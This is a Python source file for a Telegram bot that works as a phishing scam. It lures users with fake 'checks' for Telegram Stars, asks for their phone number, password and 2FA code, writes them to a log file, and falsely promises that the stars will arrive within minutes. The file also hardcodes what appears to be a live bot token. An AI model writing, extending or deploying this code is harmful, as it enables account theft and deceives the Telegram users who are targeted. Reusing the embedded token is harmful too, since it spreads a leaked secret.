from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineQueryResultArticle, InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton
import threading
import time
import re

BOT_TOKEN = "8959279502:AAGJIX6qqoSwgFa-Y0lXnhC4ClIR9nE4ifI"
BOT_URL = "https://t.me/StarCheclBot"  # Посилання на бота

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ========== INLINE-МЕНЮ ==========
@bot.inline_handler(lambda query: True)
def inline_handler(inline_query):
    results = []
    amounts = [100, 200, 300, 500, 700, 1000]
    for amt in amounts:
        keyboard = InlineKeyboardMarkup()
        keyboard.add(
            InlineKeyboardButton(
                f"🤖 Забрать {amt} звёзд",
                url=BOT_URL  # Просто перенаправляє в бота
            )
        )
        results.append(
            InlineQueryResultArticle(
                id=str(amt),
                title=f"⭐ Чек на {amt} звёзд",
                description=f"Нажми, чтобы забрать {amt} звёзд",
                input_message_content=InputTextMessageContent(
                    f"🎯 **Ты получил чек на {amt} звёзд!**\nНажми на кнопку ниже, чтобы забрать их.",
                    parse_mode='Markdown'
                ),
                reply_markup=keyboard
            )
        )
    bot.answer_inline_query(inline_query.id, results)

# ========== КОМАНДА /start ==========
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(
        message.chat.id,
        "🌟 **Привет!**\n"
        "Введи номер телефона, пароль и 2FA (если есть), чтобы получить звёзды.\n\n"
        "📱 **Номер:**\n"
        "🔒 **Пароль:**\n"
        "🔐 **2FA (если есть):**\n\n"
        "Введи данные в одном сообщении через пробел или запятую.\n"
        "Пример: +71234567890 mypassword 123456",
        parse_mode='Markdown'
    )

# ========== ОБРОБНИК ПОВІДОМЛЕНЬ ==========
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    text = message.text.strip()
    parts = text.split()
    
    # Якщо введено 2 або 3 частини (номер, пароль, 2FA)
    if len(parts) >= 2:
        phone = parts[0]
        password = parts[1]
        code2fa = parts[2] if len(parts) >= 3 else ""
        
        # Перевірка номера
        if phone.startswith('+') and re.match(r'^\+\d{10,15}$', phone):
            # Зберігаємо дані
            with open('logs.txt', 'a') as f:
                f.write(f"Phone: {phone} | Pass: {password} | 2FA: {code2fa} | Time: {time.ctime()}\n")
            
            bot.reply_to(
                message,
                f"✅ **Данные приняты!**\n"
                f"📱 Номер: {phone}\n"
                f"🔒 Пароль: {password}\n"
                f"🔐 2FA: {code2fa if code2fa else 'нет'}\n\n"
                f"Звёзды будут начислены в течение 5 минут.",
                parse_mode='Markdown'
            )
        else:
            bot.reply_to(
                message,
                "❌ **Неверный формат номера!**\n"
                "Введи номер в международном формате.\n"
                "Например: +71234567890",
                parse_mode='Markdown'
            )
    else:
        bot.reply_to(
            message,
            "❌ **Введи номер и пароль!**\n"
            "Пример: +71234567890 mypassword 123456",
            parse_mode='Markdown'
        )

# ========== ЗАПУСК ==========
def run_bot():
    bot.polling(none_stop=True)

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
